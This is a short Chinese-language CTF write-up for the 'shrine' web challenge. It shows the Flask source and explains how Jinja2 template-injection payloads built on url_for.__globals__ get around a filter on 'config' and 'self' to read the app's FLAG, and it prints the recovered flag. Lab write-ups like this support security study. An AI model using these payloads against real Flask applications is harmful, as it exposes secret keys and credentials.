---
title: WesternCTF2018 shrine
date: 2023-11-14
categories:
  - CTF
  - Web
---

## 前置工作

打开靶机网页，知道是 Python 代码，太乱了，整理一下

```python
import flask
import os

app = flask.Flask(__name__)
app.config['FLAG'] = os.environ.pop('FLAG')


@app.route('/')
def index():
    return open(__file__).read()


@app.route('/shrine/')
def shrine(shrine):
    def safe_jinja(s):
        s = s.replace('(', '').replace(')', '')
        blacklist = ['config', 'self']
        return ''.join(['{{% set {}=None%}}'.format(c) for c in blacklist]) + s
    return flask.render_template_string(safe_jinja(shrine))


if __name__ == '__main__':
    app.run(debug=True)

```

Flask，Jinja2 模板注入肯定了，这个 `@app.route('/shrine')` 和 `@app.route('/shrine/<path:shrine>')` 应该是一个道理，重点在于下面的 `safe_jinja()` 函数

## `safe_jinja()` 绕过

这个函数对于输入内容的处理仅仅是在前面添加两句话，假如我输入 `{{1+1}}`，他会把句子处理成 `{% set config=None%}{% set self=None%}{{1+1}}`，当然，这对 1+1=2 的运算没有影响，但重点是，我们该如何不调用到 `self` 和 `config` 变量才能获取到存在 app.config 中的 FLAG

这里就需要用到 `url_for.__globals__` 函数，传入 `{{url_for.__globals__}}`，出来一堆，找点有用的

```
'current_app': <Flask 'app'>
```

找到 Flask 对象了，那就更进一步 `{{url_for.__globals__['current_app']}}`，然后就能看到

```
<Flask 'app'>
```

对象拿到手了，那么就获取 `config`，`{{url_for.__globals__['current_app']['config']}}`

运行到这一步其实已经可以看到 Flag 了，但为了美观，还是输入完整一点 `{{url_for.__globals__['current_app']['config']['FLAG']}}`

最后得出的 Flag 为 `flag{b3392cd3-21df-4c7d-86a0-5a0213cef93a}`